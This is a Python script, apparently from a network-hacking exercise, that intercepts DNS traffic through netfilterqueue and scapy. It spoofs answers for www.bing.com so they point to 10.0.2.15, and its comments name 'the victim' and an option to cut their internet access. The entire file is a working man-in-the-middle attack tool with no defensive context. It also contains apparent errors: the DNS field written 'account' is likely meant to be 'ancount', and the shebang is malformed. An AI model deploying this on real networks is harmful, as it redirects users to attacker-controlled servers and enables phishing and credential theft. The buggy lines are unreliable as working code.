#!/usr/bin/env/python3


import netfilterqueue
import scapy.all as scapy

def process_packet(packet):
    scapy_packet=scapy.IP(packet.get_payload()) # make the payload as a scapy packet
    if scapy_packet.haslayer(scapy.DNSRR):
        qname=scapy_packet[scapy.DNSQR].qname
        print(type(qname))
        if "www.bing.com" in qname.decode():
            print("[+]Spoofing target")
            answer=scapy.DNSRR(rrname=qname,rdata="10.0.2.15") #Spoofed answer
            scapy_packet[scapy.DNS].an= answer
            scapy_packet[scapy.DNS].account=1 #Specifies number of responses
            print(type(scapy_packet))

            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            packet.set_payload(bytes(scapy_packet))
        # print(scapy_packet.show())

    # print(packet.get_payload()) # get_payload --> Actual content of the packet
    packet.accept() # The victim can access the sites
    # packet.drop() #Cut the internet

queue= netfilterqueue.NetfilterQueue()
queue.bind(0,process_packet) #bind will make the variable 'queue' to bind with the queue which we ran on the terminal
queue.run()

